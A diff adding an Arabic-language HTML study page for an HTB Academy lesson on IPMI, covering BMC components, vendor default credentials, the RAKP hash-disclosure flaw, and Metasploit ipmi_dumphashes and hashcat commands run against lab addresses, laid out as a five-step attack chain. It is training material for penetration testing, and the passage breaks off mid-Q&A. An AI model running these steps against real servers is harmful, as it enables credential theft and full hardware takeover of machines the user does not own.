@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IPMI — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030810;--surface:rgba(8,15,28,0.75);--border:#0e2035;--accent:#00d4ff;--green:#39ff14;--red:#FF5757;--yellow:#fbbf24;--purple:#a855f7;--text:#b8ccd8;--muted:#3a5060;--white:#e8f4ff;--mono:'IBM Plex Mono',monospace;--sans:'Rajdhani',sans-serif;--tag:'Share Tech Mono',monospace;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{background:url('https://raw.githubusercontent.com/husein690/roadmap/main/assets/kuggen.jpg') no-repeat center center fixed!important;background-size:cover!important;background-color:#030810!important;}
+body::before{content:''!important;position:fixed!important;inset:0!important;background:rgba(2,6,14,0.72)!important;z-index:0!important;display:block!important;pointer-events:none!important;}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(0,212,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.02) 1px,transparent 1px);background-size:40px 40px;}
+body{color:var(--text);font-family:var(--sans);min-height:100vh;}
+#glass-particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+.wrap{max-width:1000px;margin:0 auto;padding:32px 18px 80px;position:relative;z-index:2;}
+
+.back-btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--muted);text-decoration:none;padding:6px 14px;border:1px solid var(--muted);margin-bottom:28px;transition:all .2s;}
+.back-btn:hover{color:var(--accent);border-color:var(--accent);}
+
+.hdr{margin-bottom:32px;}
+.hdr-tag{font-family:var(--tag);font-size:10px;color:var(--green);letter-spacing:5px;margin-bottom:12px;animation:blink 2.5s infinite;}
+@keyframes blink{0%,100%{opacity:1}55%{opacity:.3}}
+.hdr-name{font-family:var(--mono);font-size:clamp(22px,4vw,40px);font-weight:700;color:var(--white);letter-spacing:-1px;text-shadow:0 0 40px rgba(0,212,255,.3);}
+.hdr-name span{color:var(--accent);}
+.hdr-sub{font-family:var(--tag);font-size:10px;color:var(--muted);letter-spacing:3px;margin-top:8px;}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:16px 0;opacity:.3;}
+
+.facts-bar{display:flex;flex-wrap:wrap;margin-bottom:28px;background:rgba(8,18,36,0.52);backdrop-filter:blur(18px);border:1px solid rgba(0,212,255,0.18);box-shadow:0 4px 30px rgba(0,0,0,.35);}
+.fact{flex:1;min-width:110px;padding:12px 16px;border-left:1px solid var(--border);}
+.fact:last-child{border-left:none;}
+.fact-val{font-family:var(--mono);font-size:16px;font-weight:700;color:var(--accent);}
+.fact-lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px;}
+
+.nav{display:flex;flex-wrap:wrap;gap:0;margin-bottom:24px;border-bottom:1px solid var(--border);}
+.nav-btn{font-family:var(--tag);font-size:10px;letter-spacing:1px;padding:12px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.nav-btn:hover{color:var(--accent);border-bottom-color:var(--accent);}
+.nav-btn.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(0,212,255,.05);}
+
+.panel{display:none;}
+.panel.active{display:block;}
+
+.sec-label{font-family:var(--tag);font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin:20px 0 10px;display:flex;align-items:center;gap:10px;}
+.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+
+.card{background:rgba(8,18,36,0.48);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.08);padding:18px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--accent);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card.success::before{background:var(--green);opacity:.6;}
+.card.warn::before{background:var(--yellow);opacity:.6;}
+.card-title{font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--accent);margin-bottom:12px;text-transform:uppercase;}
+.card-title::before{content:'▸ ';color:var(--green);}
+
+.code{background:rgba(1,4,9,0.8);border:1px solid var(--border);border-right:3px solid var(--accent);padding:14px;font-family:var(--mono);font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.7;margin:8px 0;}
+.code .cmd{color:var(--accent);}
+.code .ok{color:var(--green);}
+.code .err{color:var(--red);}
+.code .cmt{color:var(--muted);}
+.code .val{color:var(--yellow);}
+
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0;}
+th{background:rgba(1,4,9,0.8);color:var(--accent);padding:8px 12px;text-align:right;border:1px solid var(--border);font-family:var(--tag);font-size:9px;letter-spacing:1px;text-transform:uppercase;}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text);font-size:11px;vertical-align:top;}
+tr:nth-child(even) td{background:rgba(8,15,28,0.5);}
+tr:nth-child(odd) td{background:rgba(1,4,9,0.4);}
+td.mono{font-family:var(--mono);color:var(--accent);}
+td.danger{color:var(--red);}
+td.safe{color:var(--green);}
+td.warn{color:var(--yellow);}
+
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;line-height:1.6;}
+.alert.danger{background:rgba(255,87,87,.08);border-color:var(--red);color:#ff9999;}
+.alert.success{background:rgba(57,255,20,.08);border-color:var(--green);color:#99ff99;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--accent);color:#99e8ff;}
+.alert.warning{background:rgba(251,191,36,.08);border-color:var(--yellow);color:#ffe599;}
+
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:rgba(1,4,9,0.6);border:1px solid var(--border);padding:12px;}
+.info-box-title{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin:12px 0;}
+.tool-btn{background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:12px 8px;text-align:center;cursor:pointer;transition:all .2s;font-family:var(--tag);font-size:10px;color:var(--muted);}
+.tool-btn:hover{border-color:var(--accent);color:var(--accent);}
+.tool-btn.active{border-color:var(--green);color:var(--green);background:rgba(57,255,20,.05);}
+.tool-btn .ti{font-size:20px;margin-bottom:6px;display:block;}
+.tool-panel{display:none;}
+.tool-panel.active{display:block;}
+
+.chain{display:flex;align-items:center;flex-wrap:wrap;margin:12px 0;}
+.chain-step{flex:1;min-width:80px;background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:10px 8px;text-align:center;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;font-family:var(--tag);}
+.chain-step .step-sub{color:var(--muted);font-size:9px;margin-top:2px;font-family:var(--tag);}
+.chain-step.hl{border-color:var(--red);background:rgba(255,87,87,.05);}
+.chain-arrow{color:var(--accent);font-size:14px;padding:0 4px;}
+
+.mstep{display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--border);align-items:flex-start;}
+.mstep:last-child{border-bottom:none;}
+.mnum{background:var(--accent);color:#000;width:24px;height:24px;min-width:24px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold;margin-top:2px;font-family:var(--mono);}
+.mcontent{flex:1;}
+.mtitle{color:var(--accent);font-size:12px;margin-bottom:4px;font-family:var(--tag);letter-spacing:1px;}
+.mdesc{color:var(--muted);font-size:11px;line-height:1.6;}
+
+.qa{margin:10px 0;}
+.qa-q{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--accent);}
+.qa-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.qa-a{background:rgba(57,255,20,.05);border:1px solid rgba(57,255,20,.2);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.qa-a::before{content:'✅ الجواب: ';color:var(--green);}
+
+.lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin:10px 0 6px;}
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+<canvas id="glass-particles"></canvas>
+<div class="wrap">
+
+<a href="protocols.html" class="back-btn">◄ BACK TO PROTOCOLS</a>
+
+<div class="hdr">
+  <div class="hdr-tag">► HTB ACADEMY · MODULE 112 · SECTION 16/21</div>
+  <div class="hdr-name">IPMI — <span>INTELLIGENT PLATFORM MANAGEMENT INTERFACE</span></div>
+  <div class="hdr-sub">HARDWARE MANAGEMENT · BMC · RAKP VULNERABILITY · HASH DUMPING</div>
+  <div class="divider"></div>
+</div>
+
+<div class="facts-bar">
+  <div class="fact"><div class="fact-val">623</div><div class="fact-lbl">UDP Port</div></div>
+  <div class="fact"><div class="fact-val">BMC</div><div class="fact-lbl">Core Component</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">RAKP</div><div class="fact-lbl">Critical Vuln</div></div>
+  <div class="fact"><div class="fact-val">7300</div><div class="fact-lbl">Hashcat Mode</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">ADMIN:ADMIN</div><div class="fact-lbl">Default Creds</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">≈ Physical</div><div class="fact-lbl">BMC Access</div></div>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('components',this)">Components</button>
+  <button class="nav-btn" onclick="showPanel('defaults',this)">Default Creds</button>
+  <button class="nav-btn" onclick="showPanel('rakp',this)">RAKP Vuln</button>
+  <button class="nav-btn" onclick="showPanel('tools',this)">Tools</button>
+  <button class="nav-btn" onclick="showPanel('methodology',this)">Methodology</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Explained Q&A</button>
+</div>
+
+<!-- OVERVIEW -->
+<div id="panel-overview" class="panel active">
+
+  <div class="card">
+    <div class="card-title">ما هو IPMI؟</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      IPMI = نظام إدارة الـ hardware مستقل كاملاً عن الـ OS. يشتغل حتى لو السيرفر مطفي أو معطل. نُشر أول مرة من Intel عام 1998 ويدعمه أكثر من 200 شركة.
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">IPMI vs SNMP</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--muted);">SNMP:</span> يراقب الـ software والـ OS<br>
+          يشتغل بعد ما الـ OS اشتغل<br>
+          <span style="color:var(--red);">لو السيرفر مطفي = ما يشتغل ❌</span><br><br>
+          <span style="color:var(--green);">IPMI:</span> يراقب الـ hardware مباشرة<br>
+          مستقل عن الـ OS كاملاً<br>
+          <span style="color:var(--green);">حتى لو السيرفر مطفي = يشتغل ✅</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">تشبيه</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--muted);">SNMP</span> = طبيب يفحص المريض وهو صاحي<br><br>
+          <span style="color:var(--green);">IPMI</span> = أجهزة المستشفى تراقب المريض حتى وهو فاقد الوعي أو نايم 🏥
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">3 حالات استخدام الـ Sysadmin</div>
+    <p style="font-size:11px;color:var(--muted);margin-bottom:10px;">هاي الحالات يستخدمها الـ sysadmin للصيانة — كأنه موجود فيزيائياً أمام السيرفر بدون ما يروح للغرفة:</p>
+    <div style="display:flex;flex-direction:column;gap:8px;direction:ltr;">
+      <div style="background:rgba(1,4,9,0.6);border:1px solid rgba(0,212,255,.2);padding:10px 14px;font-size:11px;">
+        <span style="color:var(--accent);">1.</span> <span style="color:var(--text);">Before the OS boots</span>
+        <div style="color:var(--muted);font-size:10px;margin-top:3px;">تعديل BIOS settings قبل ما يشتغل الـ OS</div>
+      </div>
+      <div style="background:rgba(1,4,9,0.6);border:1px solid rgba(0,212,255,.2);padding:10px 14px;font-size:11px;">
+        <span style="color:var(--accent);">2.</span> <span style="color:var(--text);">When host is powered down</span>
+        <div style="color:var(--muted);font-size:10px;margin-top:3px;">السيرفر مطفي كاملاً — يشغّله عن بعد</div>
+      </div>
+      <div style="background:rgba(1,4,9,0.6);border:1px solid rgba(0,212,255,.2);padding:10px 14px;font-size:11px;">
+        <span style="color:var(--accent);">3.</span> <span style="color:var(--text);">After a system failure</span>
+        <div style="color:var(--muted);font-size:10px;margin-top:3px;">السيرفر انهار — يتصل فيه ويشوف المشكلة</div>
+      </div>
+    </div>
+    <div class="alert info" style="margin-top:10px;">💡 IPMI يراقب كمان: درجة الحرارة، الفولتية، الـ fans، الـ power supplies، وينبّه عبر SNMP</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">BMC — قلب IPMI</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      BMC = Baseboard Management Controller — كمبيوتر صغير مستقل داخل السيرفر. معالجه ARM يشغّل Linux خاص، موصول مباشرة بالـ Motherboard.
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">وين يكون BMC؟</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          <span style="color:var(--green);">1.</span> مدمج في الـ Motherboard مباشرة (الأكثر شيوعاً)<br>
+          <span style="color:var(--green);">2.</span> PCI card تضيفه لاحقاً
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">أشهر الـ BMCs</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;direction:ltr;">
+          HP → <span style="color:var(--accent);">iLO</span> (Integrated Lights-Out)<br>
+          Dell → <span style="color:var(--accent);">iDRAC</span> (Remote Access Controller)<br>
+          Supermicro → <span style="color:var(--accent);">IPMI</span>
+        </div>
+      </div>
+    </div>
+    <div class="alert danger">💀 اخترقت BMC = physical access كامل للسيرفر! تقدر تراقب، تشغّل، تطفي، أو تعيد تثبيت الـ OS.</div>
+  </div>
+
+</div>
+
+<!-- COMPONENTS -->
+<div id="panel-components" class="panel">
+
+  <div class="card">
+    <div class="card-title">مكونات IPMI الخمسة</div>
+    <table>
+      <tr><th>المكون</th><th>الاختصار</th><th>الوظيفة</th></tr>
+      <tr>
+        <td style="color:var(--white);font-weight:bold;">Baseboard Management Controller</td>
+        <td class="mono" style="color:var(--red);">BMC</td>
+        <td>القلب — كمبيوتر ARM صغير يشغّل Linux، موصول بالـ Motherboard مباشرة</td>
+      </tr>
+      <tr>
+        <td style="color:var(--white);">Intelligent Chassis Management Bus</td>
+        <td class="mono">ICMB</td>
+        <td>يسمح بالتواصل بين chassis وثاني — إدارة عدة servers في نفس الـ rack</td>
+      </tr>
+      <tr>
+        <td style="color:var(--white);">Intelligent Platform Management Bus</td>
+        <td class="mono">IPMB</td>
+        <td>يمدّد قدرات الـ BMC — يوصّل أجهزة وسensors إضافية</td>
+      </tr>
+      <tr>
+        <td style="color:var(--white);">IPMI Memory</td>
+        <td class="mono">—</td>
+        <td>ذاكرة خاصة تخزن: System Event Log + Repository data</td>
+      </tr>
+      <tr>
+        <td style="color:var(--white);">Communications Interfaces</td>
+        <td class="mono">—</td>
+        <td>طرق التواصل: Local, Serial, LAN (Port 623 UDP), PCI Bus</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">صورة كاملة للمكونات</div>
+    <div class="code"><span class="cmt">BMC (القلب — ARM + Linux)</span>
+    ↕ <span class="val">IPMB</span>    ← يوسّع BMC ويوصّل sensors إضافية
+    ↕ <span class="val">ICMB</span>    ← يتواصل مع servers أخرى في نفس الـ rack
+    ↕ <span class="val">Memory</span>  ← يخزن System Event Log وبيانات الـ inventory
+    ↕ <span class="val">Interfaces</span> ← LAN (Port 623 UDP) + Serial + PCI</div>
+    <div class="alert info">💡 IPMI يحتاج مصدر طاقة + LAN connection عشان يشتغل — حتى لو السيرفر مطفي</div>
+  </div>
+
+</div>
+
+<!-- DEFAULT CREDENTIALS -->
+<div id="panel-defaults" class="panel">
+
+  <div class="card danger">
+    <div class="card-title">⚠️ Default Credentials</div>
+    <table>
+      <tr><th>المنتج</th><th>Username</th><th>Password</th><th>الخطر</th></tr>
+      <tr>
+        <td style="color:var(--text);">Dell iDRAC</td>
+        <td class="mono">root</td>
+        <td class="mono danger">calvin</td>
+        <td class="warn">شائع — كثير ما يتغير</td>
+      </tr>
+      <tr>
+        <td style="color:var(--text);">HP iLO</td>
+        <td class="mono">Administrator</td>
+        <td class="mono warn">8 أحرف عشوائية</td>
+        <td class="warn">يبدو أأمن بس قابل للكسر!</td>
+      </tr>
+      <tr>
+        <td style="color:var(--text);">Supermicro IPMI</td>
+        <td class="mono">ADMIN</td>
+        <td class="mono danger">ADMIN</td>
+        <td class="danger">الأخطر — أبسط باسورد ممكن 💀</td>
+      </tr>
+    </table>
+    <div class="alert danger">🎯 دايماً جرب الـ default credentials أول — كثير admins ما يغيرونها!</div>
+  </div>
+
+  <div class="card warn">
+    <div class="card-title">⚠️ HP iLO — يبدو أأمن بس ليس كذلك!</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:10px;">
+      HP iLO يستخدم باسورد عشوائي 8 أحرف من أرقام وحروف كبيرة فقط:
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">المشكلة</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;direction:ltr;margin-top:6px;">
+          أرقام (0-9) = 10 خيار<br>
+          حروف كبيرة (A-Z) = 26 خيار<br>
+          المجموع = 36 خيار لكل حرف<br>
+          8 أحرف = 36^8 = 2.8 تريليون<br>
+          <span style="color:var(--red);">← قابل للكسر بـ hashcat في ساعات!</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">أمر الكسر</div>
+        <div class="code" style="margin:6px 0;border-right:none;padding:6px 8px;font-size:10px;direction:ltr;text-align:left;">hashcat -m 7300 ipmi.txt \
+  -a 3 ?1?1?1?1?1?1?1?1 \
+  -1 ?d?u</div>
+        <div style="font-size:10px;color:var(--muted);direction:rtl;">?d = أرقام / ?u = حروف كبيرة</div>
+      </div>
+    </div>
+    <div class="alert warning">⚠️ لو كان الباسورد يشمل حروف صغيرة + رموز = أصعب بكثير للكسر</div>
+  </div>
+
+</div>
+
+<!-- RAKP VULNERABILITY -->
+<div id="panel-rakp" class="panel">
+
+  <div class="card danger">
+    <div class="card-title">💀 RAKP Vulnerability — ثغرة في IPMI 2.0</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      RAKP = Remote Authenticated Key-Exchange Protocol. الثغرة في تصميم البروتوكول نفسه — لا يمكن إصلاحها بدون كسر الـ IPMI 2.0 spec كاملاً.
+    </p>
+
+    <div class="lbl">المصادقة العادية:</div>
+    <div class="code"><span class="cmt"># المنطق الطبيعي (مثل SSL/TLS):</span>
+Client يشفر بـ <span class="ok">public key</span>
+السيرفر يفك التشفير بـ <span class="ok">private key</span>
+        ↓
+<span class="ok">ما في معلومات تطلع للمهاجم ✅</span></div>
+
+    <div class="lbl">RAKP — المنطق المعيب:</div>
+    <div class="code"><span class="cmt"># أنت تقول للسيرفر:</span>
+<span class="cmd">"أنا ADMIN"</span>
+        ↓
+<span class="err">السيرفر يرسل فوراً: hash لباسورد ADMIN!</span>
+<span class="err">قبل ما تثبت هويتك!</span>
+<span class="err">قبل ما تعطي أي باسورد!</span>
+        ↓
+<span class="err">= أي شخص يطلب الـ hash يحصل عليه مجاناً! 💀</span></div>
+
+    <div class="alert danger">
+      🎯 تشبيه: زي لو قلت لحارس "أنا محمد"<br>
+      فقال لك "باسورد محمد هو XYZ" قبل ما يسألك أي سؤال! 😄
+    </div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">🔑 Salt — إيش يعني؟</div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">بدون Salt ❌</div>
+        <div class="code" style="margin:6px 0;border-right:none;padding:6px 8px;font-size:10px;direction:ltr;text-align:left;">password123 → hash → ABC123
+password123 → hash → ABC123
+↓
+نفس الباسورد = نفس الـ hash
+سهل يكشفه المهاجم!</div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">مع Salt ✅</div>
+        <div class="code" style="margin:6px 0;border-right:none;padding:6px 8px;font-size:10px;direction:ltr;text-align:left;">password123 + xK9m → ZYX987
+password123 + pQ2n → MNL456
+↓
+نفس الباسورد + salt مختلف
+= hash مختلف = أصعب للكسر</div>
+      </div>
+    </div>
+    <div class="alert info">💡 RAKP يرسل salted SHA1 أو MD5 hash — بس حتى مع الـ salt يمكن كسره offline بـ hashcat</div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">❌ ليش "No Direct Fix"؟</div>
+    <div class="code"><span class="cmt"># الثغرة في تصميم البروتوكول نفسه:</span>
+المصممون أرادوا:
+الـ client يتحقق من هوية السيرفر أول
+(mutual authentication)
+        ↓
+<span class="err">بس ما فكروا:</span>
+<span class="err">لو المهاجم طلب الـ hash</span>
+<span class="err">السيرفر ما يرفض!</span>
+        ↓
+<span class="cmt">لو صلحوها = كسروا الـ IPMI 2.0 spec كاملاً</span>
+<span class="cmt">= كل الأجهزة تحتاج تتغير!</span>
+        ↓
+<span class="ok">الحل الوحيد:</span>
+<span class="ok">باسوردات قوية جداً + network segmentation ✅</span></div>
+  </div>
+
+</div>
+
+<!-- TOOLS -->
+<div id="panel-tools" class="panel">
+
+  <div class="lbl">اختر الأداة:</div>
+  <div class="tool-grid">
+    <div class="tool-btn active" onclick="showTool('nmap',this)"><span class="ti">🔍</span>Nmap</div>
+    <div class="tool-btn" onclick="showTool('msf_version',this)"><span class="ti">⚡</span>MSF Version</div>
+    <div class="tool-btn" onclick="showTool('msf_dump',this)"><span class="ti">💀</span>MSF Dump</div>
+    <div class="tool-btn" onclick="showTool('hashcat',this)"><span class="ti">🔓</span>hashcat</div>
+  </div>
+
+  <div id="tool-nmap" class="tool-panel active">
+    <div class="card"><div class="card-title">🔍 Nmap على IPMI</div>
+    <div class="code"><span class="cmd">sudo nmap -sU --script ipmi-version -p 623 TARGET</span>
+
+PORT    STATE SERVICE
+<span class="ok">623/udp open  asf-rmcp</span>
+| ipmi-version:
+|   Version: <span class="val">IPMI-2.0</span>
+|   UserAuth:
+|   PassAuth: <span class="val">auth_user, non_null_user</span>
+|_ Level: 2.0
+MAC Address: 14:03:DC:674:18:6A <span class="ok">(Hewlett Packard Enterprise)</span></div>
+    <div class="alert info">💡 MAC Address يكشف نوع الـ BMC — HP, Dell, Supermicro → تعرف الـ default credentials!</div>
+    </div>
+  </div>
+
+  <div id="tool-msf_version" class="tool-panel">
+    <div class="card"><div class="card-title">⚡ Metasploit — Version Scan</div>
+    <div class="code"><span class="cmd">msf6 > use auxiliary/scanner/ipmi/ipmi_version</span>
+<span class="cmd">msf6 > set rhosts 10.129.42.195</span>
+<span class="cmd">msf6 > run</span>
+
+<span class="ok">[+] 10.129.42.195:623 - IPMI-2.0</span>
+<span class="ok">    UserAuth(auth_msg, auth_user, non_null_user)</span>
+<span class="ok">    PassAuth(password, md5, md2, null)</span>
+<span class="ok">    Level(1.5, 2.0)</span></div>
+    </div>
+  </div>
+
+  <div id="tool-msf_dump" class="tool-panel">
+    <div class="card"><div class="card-title">💀 Metasploit — Dump Hashes (RAKP)</div>
+    <div class="code"><span class="cmd">msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes</span>
+<span class="cmd">msf6 > set rhosts 10.129.42.195</span>
+<span class="cmd">msf6 > set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt</span>
+<span class="cmd">msf6 > run</span>
+
+<span class="ok">[+] Hash found: ADMIN:8e160d4802040000...</span>
+<span class="ok">[+] Hash for user 'ADMIN' matches password 'ADMIN'</span></div>
+    <div class="alert info">
+      💡 الـ Options المهمة:<br>
+      OUTPUT_HASHCAT_FILE = يحفظ الـ hashes بالـ format الصح لـ hashcat تلقائياً<br>
+      OUTPUT_JOHN_FILE = يحفظها بـ format John the Ripper<br>
+      USER_FILE = قائمة usernames للتجربة<br>
+      PASS_FILE = قائمة باسوردات للكسر التلقائي
+    </div>
+    </div>
+  </div>
+
+  <div id="tool-hashcat" class="tool-panel">
+    <div class="card"><div class="card-title">🔓 hashcat — كسر الـ Hashes</div>
+    <div class="lbl">IPMI عادي:</div>
+    <div class="code"><span class="cmd">hashcat -m 7300 /tmp/ipmi_hashes.txt rockyou.txt</span></div>
+    <div class="lbl">HP iLO (8 أحرف أرقام + حروف كبيرة):</div>
+    <div class="code"><span class="cmd">hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</span>
+<span class="cmt"># -a 3 = mask attack (يجرب كل التركيبات)
+# ?1   = الـ charset المحدد في -1
+# ?d   = أرقام 0-9
+# ?u   = حروف كبيرة A-Z</span></div>
+    <div class="alert info">💡 -m 7300 = IPMI2 RAKP HMAC-SHA1 hash type</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- METHODOLOGY -->
+<div id="panel-methodology" class="panel">
+
+  <div class="card">
+    <div class="card-title">⛓️ خطوات الـ IPMI Footprinting</div>
+    <div class="mstep">
+      <div class="mnum">1</div>
+      <div class="mcontent">
+        <div class="mtitle">Nmap Scan — اكتشاف IPMI</div>
+        <div class="mdesc">تحقق إذا Port 623 UDP مفتوح + إصدار IPMI + نوع البائع</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">sudo nmap -sU --script ipmi-version -p 623 TARGET</span></div>
+        <div class="alert info" style="margin-top:6px;">💡 MAC Address يكشف: HP, Dell, Supermicro → تعرف الـ default credentials</div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">2</div>
+      <div class="mcontent">
+        <div class="mtitle">جرب Default Credentials</div>
+        <div class="mdesc">قبل أي شيء — جرب الـ default passwords</div>
+        <div class="code" style="margin-top:6px;"><span class="cmt"># HP iLO → Administrator : randomized
+# Dell iDRAC → root : calvin
+# Supermicro → ADMIN : ADMIN  ← ابدأ بها!</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">3</div>
+      <div class="mcontent">
+        <div class="mtitle">استغل RAKP — اسرق الـ Hashes</div>
+        <div class="mdesc">حتى بدون credentials — تقدر تجيب الـ hashes!</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 > set rhosts TARGET
+msf6 > set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt
+msf6 > run</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">4</div>
+      <div class="mcontent">
+        <div class="mtitle">كسر الـ Hashes offline</div>
+        <div class="mdesc">بعيداً عن السيرفر — سريع وما يُسجل</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">hashcat -m 7300 /tmp/ipmi_hashes.txt rockyou.txt</span></div>
+        <div class="alert danger" style="margin-top:6px;">🎯 لو الباسورد تكرر في أماكن ثانية = دخول SSH لـ servers أخرى!</div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">5</div>
+      <div class="mcontent">
+        <div class="mtitle">الدخول للـ BMC Web Console</div>
+        <div class="mdesc">بعد ما تكسر الباسورد — ادخل على الـ web interface</div>
+        <div class="code" style="margin-top:6px;"><span class="cmt"># HP iLO:   https://TARGET/
+# Dell iDRAC: https://TARGET/
+# Supermicro: https://TARGET/
+        ↓
+# Full hardware control! 💀</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⛓️ Attack Chain</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Nmap</div><div class="step-sub">UDP 623</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔑</div><div class="step-name">Default Creds</div><div class="step-sub">ADMIN:ADMIN</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">💀</div><div class="step-name">RAKP Dump</div><div class="step-sub">ipmi_dumphashes</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔓</div><div class="step-name">hashcat</div><div class="step-sub">-m 7300</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step hl"><div class="step-icon">💥</div><div class="step-name">BMC Access</div><div class="step-sub">= Physical!</div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- EXPLAINED Q&A -->
+<div id="panel-explained" class="panel">
+
+  <div class="card">
+    <div class="card-title">🌐 الأساسيات</div>
+    <div class="qa">
+      <div class="qa-q">إيش الفرق بين IPMI وSNMP؟</div>
+      <div class="qa-a">SNMP يراقب الـ software والـ OS — لو السيرفر مطفي ما يشتغل. IPMI يراقب الـ hardware مباشرة — مستقل عن الـ OS كاملاً، يشتغل حتى لو السيرفر مطفي أو معطل. SNMP = طبيب يفحص المريض وهو صاحي. IPMI = أجهزة المستشفى تراقبه حتى وهو فاقد الوعي.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">ليش اخترقت BMC = physical access؟</div>
